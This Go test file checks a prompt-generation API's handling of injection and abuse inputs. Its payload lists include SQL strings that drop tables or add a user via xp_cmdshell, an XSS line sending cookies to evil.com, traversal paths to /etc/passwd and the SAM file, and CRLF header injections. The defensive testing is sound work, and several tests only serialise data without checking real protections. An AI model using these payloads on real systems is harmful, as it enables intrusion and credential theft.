package v1

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/jonwraymond/prompt-alchemy/pkg/providers"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
)

// TestSQLInjectionPrevention tests protection against SQL injection attacks
func TestSQLInjectionPrevention(t *testing.T) {
	sqlInjectionPayloads := []string{
		"'; DROP TABLE prompts; --",
		"1' OR '1'='1",
		"'; DELETE FROM users WHERE '1'='1'; --",
		"admin'--",
		"' UNION SELECT * FROM users--",
		"1'; UPDATE prompts SET score=100 WHERE '1'='1",
		"\"; DROP TABLE prompts; --",
		"' OR 1=1--",
		"'; EXEC xp_cmdshell('net user hacker password /add'); --",
		"' AND (SELECT COUNT(*) FROM prompts) > 0 --",
	}

	// For SQL injection tests, we're mainly checking that the input is properly handled
	// and doesn't cause crashes or expose data
	for _, payload := range sqlInjectionPayloads {
		t.Run(fmt.Sprintf("payload_%s", sanitizeTestName(payload)), func(t *testing.T) {
			// Test in various fields
			requests := []GenerateRequest{
				{Input: payload},
				{Input: "Test", Tags: []string{payload}},
				{Input: "Test", Persona: payload},
				{Input: "Test", Context: []string{payload}},
			}

			for _, req := range requests {
				// Validate that the payload can be safely marshaled/unmarshaled
				body, err := json.Marshal(req)
				assert.NoError(t, err)

				// Validate that the payload can be decoded
				var decoded GenerateRequest
				err = json.Unmarshal(body, &decoded)
				assert.NoError(t, err)

				// In a real system, these would be passed through parameterized queries
				// or escaped properly. Here we're just ensuring the data structure
				// can handle the malicious input without breaking.
			}
		})
	}
}

// TestXSSPrevention tests protection against Cross-Site Scripting attacks
func TestXSSPrevention(t *testing.T) {
	xssPayloads := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"<iframe src='javascript:alert(\"xss\")'></iframe>",
		"<svg onload=alert('xss')>",
		"javascript:alert('xss')",
		"<body onload=alert('xss')>",
		"<input type='text' value='<script>alert(\"xss\")</script>'>",
		"<a href='javascript:alert(\"xss\")'>click</a>",
		"<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
		"<%2Fscript%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
	}

	for _, payload := range xssPayloads {
		t.Run(fmt.Sprintf("payload_%s", sanitizeTestName(payload)), func(t *testing.T) {
			req := GenerateRequest{Input: payload}

			// Test JSON encoding/decoding
			body, err := json.Marshal(req)
			assert.NoError(t, err)

			// When JSON marshaling, dangerous characters are escaped
			jsonStr := string(body)
			assert.NotContains(t, jsonStr, "<script>")

			// Verify the payload is properly escaped in JSON
			if strings.Contains(payload, "<") {
				assert.Contains(t, jsonStr, "\\u003c") // JSON escapes < as \u003c
			}
			if strings.Contains(payload, ">") {
				assert.Contains(t, jsonStr, "\\u003e") // JSON escapes > as \u003e
			}
		})
	}
}

// TestPathTraversalPrevention tests protection against path traversal attacks
func TestPathTraversalPrevention(t *testing.T) {
	pathTraversalPayloads := []string{
		"../../etc/passwd",
		"..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252jetc%252fpasswd",
		"/var/www/../../etc/passwd",
		"C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"file:///etc/passwd",
		"\\\\server\\share\\..\\..\\sensitive",
	}

	for _, payload := range pathTraversalPayloads {
		t.Run(fmt.Sprintf("payload_%s", sanitizeTestName(payload)), func(t *testing.T) {
			// Test in context that might reference files
			req := GenerateRequest{
				Input:   "Read file",
				Context: []string{payload},
			}

			// Validate safe handling
			body, err := json.Marshal(req)
			assert.NoError(t, err)

			// Ensure the path traversal attempts are handled as plain strings
			// not as actual file paths
			var decoded GenerateRequest
			err = json.Unmarshal(body, &decoded)
			assert.NoError(t, err)
			assert.Equal(t, payload, decoded.Context[0])
		})
	}
}

// TestAuthenticationBypass tests for authentication bypass vulnerabilities
func TestAuthenticationBypass(t *testing.T) {
	// Create router with auth enabled
	routerConfig := RouterConfig{
		EnableAuth: true,
		APIKeys:    []string{"valid-api-key-123"},
	}
	routerDeps := RouterDependencies{
		Storage:  nil,
		Registry: providers.NewRegistry(),
		Engine:   nil,
		Logger:   logrus.New(),
	}
	router := NewRouter(routerConfig, routerDeps)
	handler := router.SetupRoutes()

	tests := []struct {
		name           string
		headers        map[string]string
		expectedStatus int
	}{
		{
			name:           "no api key",
			headers:        map[string]string{},
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name: "invalid api key",
			headers: map[string]string{
				"X-API-Key": "invalid-key",
			},
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name: "valid api key",
			headers: map[string]string{
				"X-API-Key": "valid-api-key-123",
			},
			expectedStatus: http.StatusOK,
		},
		{
			name: "sql injection in api key",
			headers: map[string]string{
				"X-API-Key": "' OR '1'='1",
			},
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name: "multiple auth headers - authorization takes precedence",
			headers: map[string]string{
				"X-API-Key":     "invalid",
				"Authorization": "Bearer valid-api-key-123",
			},
			expectedStatus: http.StatusOK, // Authorization header is valid and takes precedence
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/v1/providers", nil)
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			rr := httptest.NewRecorder()
			handler.ServeHTTP(rr, req)

			assert.Equal(t, tt.expectedStatus, rr.Code)
		})
	}
}

// TestHTTPHeaderInjection tests for HTTP header injection vulnerabilities
func TestHTTPHeaderInjection(t *testing.T) {
	headerInjectionPayloads := []string{
		"test\r\nX-Injected: true",
		"test\nSet-Cookie: admin=true",
		"test\r\n\r\n<script>alert('xss')</script>",
		"test%0d%0aSet-Cookie:%20admin=true",
		"test%0aSet-Cookie:%20session=hijacked",
	}

	for _, payload := range headerInjectionPayloads {
		t.Run(fmt.Sprintf("payload_%s", sanitizeTestName(payload)), func(t *testing.T) {
			// Test that header values contain the payload (Go preserves them in memory)
			req := httptest.NewRequest(http.MethodGet, "/test", nil)
			req.Header.Set("X-Custom-Header", payload)

			// When headers are set programmatically, Go preserves the values
			headerValue := req.Header.Get("X-Custom-Header")
			assert.Equal(t, payload, headerValue)

			// Note: Go's http server strips CRLF when sending over the wire,
			// but httptest.NewRequest doesn't go through that validation layer.
			// In production, middleware should validate and sanitize headers.
		})
	}
}

// TestDoSPrevention tests protection against Denial of Service attacks
func TestDoSPrevention(t *testing.T) {
	tests := []struct {
		name    string
		request GenerateRequest
	}{
		{
			name: "extremely large input",
			request: GenerateRequest{
				Input: strings.Repeat("a", 1000000), // 1MB of data
			},
		},
		{
			name: "deeply nested json",
			request: GenerateRequest{
				Input:   "test",
				Context: generateDeeplyNestedArray(100),
			},
		},
		{
			name: "many tags",
			request: GenerateRequest{
				Input: "test",
				Tags:  generateManyStrings(10000),
			},
		},
		{
			name: "high count request",
			request: GenerateRequest{
				Input: "test",
				Count: 1000000,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test that large payloads can be handled
			body, err := json.Marshal(tt.request)
			if err != nil {
				// If we can't marshal due to size, that's expected
				return
			}

			// Verify payload size
			payloadSize := len(body)
			t.Logf("Payload size: %d bytes", payloadSize)

			// In production, there would be request size limits
			// enforced by the server or middleware
			const maxRequestSize = 10 * 1024 * 1024 // 10MB
			if payloadSize > maxRequestSize {
				t.Logf("Payload exceeds max request size limit")
			}

			// Verify we can unmarshal back
			var decoded GenerateRequest
			err = json.Unmarshal(body, &decoded)
			if err == nil {
				// Validate reasonable limits would be enforced
				if decoded.Count > 100 {
					t.Logf("Count would be capped at reasonable limit")
				}
				if len(decoded.Input) > 100000 {
					t.Logf("Input length would be limited")
				}
			}
		})
	}
}

// TestCSRFProtection tests Cross-Site Request Forgery protection
func TestCSRFProtection(t *testing.T) {
	// Test requests from different origins
	origins := []struct {
		origin      string
		description string
	}{
		{"http://localhost:3000", "local development"},
		{"http://evil.com", "external malicious site"},
		{"null", "file protocol origin"},
		{"", "no origin header"},
		{"https://app.example.com", "allowed production origin"},
	}

	for _, o := range origins {
		t.Run(fmt.Sprintf("origin_%s", o.description), func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/api/v1/prompts/generate", nil)
			if o.origin != "" {
				req.Header.Set("Origin", o.origin)
			}

			// In production, CORS middleware would handle origin validation
			// This test verifies that origin headers are properly accessible
			originHeader := req.Header.Get("Origin")
			if o.origin != "" {
				assert.Equal(t, o.origin, originHeader)
			} else {
				assert.Empty(t, originHeader)
			}
		})
	}
}

// TestSecurityHeadersValidation validates security headers are properly set
func TestSecurityHeadersValidation(t *testing.T) {
	routerConfig := RouterConfig{
		EnableCORS:  true,
		CORSOrigins: []string{"https://app.example.com"},
	}
	routerDeps := RouterDependencies{
		Storage:  nil,
		Registry: providers.NewRegistry(),
		Logger:   logrus.New(),
	}
	router := NewRouter(routerConfig, routerDeps)
	handler := router.SetupRoutes()

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, req)

	// Check security headers
	expectedHeaders := map[string]string{
		"X-Content-Type-Options": "nosniff",
		"X-Frame-Options":        "DENY",
		"X-XSS-Protection":       "1; mode=block",
		"Referrer-Policy":        "strict-origin-when-cross-origin",
	}

	for header, expected := range expectedHeaders {
		assert.Equal(t, expected, rr.Header().Get(header), "Header %s not set correctly", header)
	}

	// Content-Security-Policy should be set
	csp := rr.Header().Get("Content-Security-Policy")
	assert.NotEmpty(t, csp)
	assert.Contains(t, csp, "default-src 'none'")
}

// TestInputValidationLimits tests input validation and limits
func TestInputValidationLimits(t *testing.T) {
	tests := []struct {
		name            string
		request         GenerateRequest
		expectValid     bool
		validationNotes string
	}{
		{
			name: "negative count",
			request: GenerateRequest{
				Input: "test",
				Count: -1,
			},
			expectValid:     true,
			validationNotes: "Should use default count",
		},
		{
			name: "zero count",
			request: GenerateRequest{
				Input: "test",
				Count: 0,
			},
			expectValid:     true,
			validationNotes: "Should use default count",
		},
		{
			name: "excessive count",
			request: GenerateRequest{
				Input: "test",
				Count: 1000,
			},
			expectValid:     true,
			validationNotes: "Should cap at reasonable limit",
		},
		{
			name: "negative temperature",
			request: GenerateRequest{
				Input:       "test",
				Temperature: -1.0,
			},
			expectValid:     true,
			validationNotes: "Should use default temperature",
		},
		{
			name: "excessive temperature",
			request: GenerateRequest{
				Input:       "test",
				Temperature: 100.0,
			},
			expectValid:     true,
			validationNotes: "Should cap temperature",
		},
		{
			name: "negative max tokens",
			request: GenerateRequest{
				Input:     "test",
				MaxTokens: -100,
			},
			expectValid:     true,
			validationNotes: "Should use default max tokens",
		},
		{
			name: "excessive max tokens",
			request: GenerateRequest{
				Input:     "test",
				MaxTokens: 1000000,
			},
			expectValid:     true,
			validationNotes: "Should cap max tokens",
		},
		{
			name: "empty phases",
			request: GenerateRequest{
				Input:  "test",
				Phases: []string{},
			},
			expectValid:     true,
			validationNotes: "Should use default phases",
		},
		{
			name: "invalid phases",
			request: GenerateRequest{
				Input:  "test",
				Phases: []string{"invalid-phase", "another-invalid"},
			},
			expectValid:     true,
			validationNotes: "Should handle invalid phases gracefully",
		},
		{
			name: "null byte in string",
			request: GenerateRequest{
				Input: "test\x00null",
			},
			expectValid:     true,
			validationNotes: "Should handle null bytes",
		},
		{
			name: "unicode control characters",
			request: GenerateRequest{
				Input: "test\u0001\u0002\u0003",
			},
			expectValid:     true,
			validationNotes: "Should handle control characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test JSON serialization
			body, err := json.Marshal(tt.request)
			assert.NoError(t, err)

			// Test deserialization
			var decoded GenerateRequest
			err = json.Unmarshal(body, &decoded)
			assert.NoError(t, err)

			// Log validation notes
			t.Logf("Validation: %s", tt.validationNotes)

			// In a real handler, these values would be validated and normalized
			if decoded.Count <= 0 {
				t.Logf("Count would be set to default: 3")
			} else if decoded.Count > 100 {
				t.Logf("Count would be capped at: 100")
			}

			if decoded.Temperature < 0 || decoded.Temperature > 2.0 {
				t.Logf("Temperature would be normalized to valid range")
			}

			if decoded.MaxTokens <= 0 {
				t.Logf("MaxTokens would use provider default")
			} else if decoded.MaxTokens > 8192 {
				t.Logf("MaxTokens would be capped at provider limit")
			}
		})
	}
}

// TestJSONBombProtection tests protection against JSON expansion attacks
func TestJSONBombProtection(t *testing.T) {
	// Create a moderately nested JSON structure
	bomb := map[string]interface{}{}
	current := bomb
	for i := 0; i < 50; i++ {
		next := map[string]interface{}{}
		current["nested"] = next
		current = next
	}
	current["value"] = strings.Repeat("x", 1000)

	// Test marshaling
	bombJSON, err := json.Marshal(bomb)
	assert.NoError(t, err)

	// Check the size of the JSON
	jsonSize := len(bombJSON)
	t.Logf("JSON bomb size: %d bytes", jsonSize)

	// In production, middleware would enforce:
	// 1. Maximum request body size
	// 2. Maximum JSON nesting depth
	// 3. Timeout on parsing

	// Test that we can unmarshal it (Go's json package handles deep nesting)
	var decoded map[string]interface{}
	err = json.Unmarshal(bombJSON, &decoded)
	assert.NoError(t, err)

	// Verify the structure
	depth := 0
	current = decoded
	for {
		if nested, ok := current["nested"].(map[string]interface{}); ok {
			current = nested
			depth++
		} else {
			break
		}
	}

	assert.Equal(t, 50, depth) // 50 levels created
	t.Logf("JSON nesting depth: %d", depth)
}

// Helper functions

func createTestHandler() *V1Handler {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	// For security tests, we don't need actual engine functionality
	// The tests are focused on security aspects, not prompt generation
	return NewV1Handler(nil, providers.NewRegistry(), nil, nil, nil, logger)
}

func sanitizeTestName(name string) string {
	// Replace special characters with underscores for test names
	replacer := strings.NewReplacer(
		"'", "_",
		"\"", "_",
		" ", "_",
		";", "_",
		"--", "_",
		"/", "_",
		"\\", "_",
		"=", "_",
		"(", "_",
		")", "_",
		"<", "_",
		">", "_",
		":", "_",
		",", "_",
		".", "_",
		"%", "_",
		"\r", "_",
		"\n", "_",
	)
	return replacer.Replace(name)
}

func generateDeeplyNestedArray(depth int) []string {
	if depth <= 0 {
		return []string{"end"}
	}
	// Create a string that when parsed would create deep nesting
	return []string{fmt.Sprintf("level_%d", depth)}
}

func generateManyStrings(count int) []string {
	result := make([]string, count)
	for i := 0; i < count; i++ {
		result[i] = fmt.Sprintf("tag_%d", i)
	}
	return result
}
